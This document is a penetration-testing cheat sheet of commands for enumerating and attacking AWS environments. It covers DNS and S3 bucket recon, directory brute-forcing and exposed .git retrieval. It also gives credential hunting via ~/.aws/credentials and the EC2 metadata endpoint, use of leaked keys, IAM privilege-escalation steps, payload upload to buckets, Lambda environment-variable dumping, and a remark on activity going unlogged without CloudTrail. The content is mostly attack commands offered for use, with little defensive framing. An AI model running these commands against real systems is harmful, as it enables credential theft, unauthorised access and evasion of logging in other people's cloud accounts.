# AWS

AWS-focused enumeration and exploitation notes preserved from the source.

## AWS

## AWS

---

🕵️ Enumeration

---

🔍 Basic Recon

```bash
host <target-domain>
whois <target-domain>
```

🌐 DNS Enumeration

```bash
dnsenum <domain>
nslookup <domain>
dig <domain> any
```

🌐 Web Page Inspection

Manually inspect source code for:
- `AWSAccessKeyId`, `SecretAccessKey`
- `*.s3.amazonaws.com`
- API endpoints (e.g. `api.<domain>.com`)
- JavaScript files like `main.js`

☁️ cloud_enum
- Install and run: [https://github.com/initstring/cloud_enum](https://github.com/initstring/cloud_enum)
- Example:
	- `python3 cloud_enum.py -k <keyword>`

## 🪣 S3 Bucket Enumeration

**Unauthenticated:**

```
aws s3 ls s3://<bucket-name> --no-sign-request
aws s3api get-bucket-acl --bucket <bucket-name> --no-sign-request
aws s3api list-objects --bucket <bucket-name> --no-sign-request
```

**With s3scanner:**

```
s3scanner --bucket <bucket-name>
```

---

## 🗂️ Directory Brute-Forcing

```
feroxbuster -u https://<target> -w /path/to/wordlist
gobuster dir -u https://<target> -w /usr/share/wordlists/dirb/common.txt
dirb https://<target>
```
- GUI: **DirBuster**

---

## 🗃️ Git Repository Exposure

```
curl -s https://<target>/.git/config
```

Tools:

- `git-dumper`
- `git-extractor`

---

## 🧾 IAM Credential Hunting

```
cat ~/.aws/credentials
cat ~/.aws/config
```

**From EC2 Instance Metadata Service (IMDS):**

```
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

---

## 🔧 System Info from EC2

```
curl http://169.254.169.254/latest/meta-data/iam/info
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
nmcli device show
```

---

## 💥 Exploitation

---

## 🚨 Leaked Credentials

**Export credentials:**

```
export AWS_ACCESS_KEY_ID=<key>
export AWS_SECRET_ACCESS_KEY=<secret>
export AWS_SESSION_TOKEN=<token>  # Optional
```

**Verify:**

```
aws sts get-caller-identity
```

---

## 🧠 IAM Privilege Escalation

**Simulate permissions:**

```
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::<account-id>:user/<user> \
  --action-names <action>
```

**List access keys:**

```
aws iam list-access-keys --user-name <username>
```

**Abuse IAM policies to:**

- Create users
- Attach policies
- Assume roles
- Generate keys

---

## 🛠️ Exploiting S3 Buckets

**Download:**

```
aws s3 cp s3://<bucket-name>/<file> .
```

**Upload:**

```
aws s3 cp payload.sh s3://<bucket-name>/
```

---

## ⚙️ Exploiting Lambda

**List functions:**

```
aws lambda list-functions
```

**Invoke function:**

```
aws lambda invoke --function-name <name> response.json
```

**Get environment variables:**

```
aws lambda get-function-configuration --function-name <name>
```

---

## 🏃 EC2 Privilege Escalation

- Extract IAM credentials via IMDS
- Lateral movement with reused SSH keys or misconfigured services

---

## 📜 CloudTrail Abuse

```
aws cloudtrail lookup-events
```

> ⚠️ If CloudTrail is disabled or misconfigured, activity may not be logged.

---

## 📦 Useful Tools

- `awscli`
- `cloud_enum`
- `s3scanner`
- `git-dumper`
- `gobuster`, `feroxbuster`, `dirb`, `dirbuster`
- `dnsenum`, `host`, `whois`, `dig`
- `nmcli`, `curl`, `jq`

---

## ✅ Tips

- Look for `.env`, `.git`, `config` leaks
- Use `aws sts get-caller-identity` to verify credentials
- On EC2, query `http://169.254.169.254` for metadata
- Don’t ignore Lambda, CloudTrail, or exposed APIs
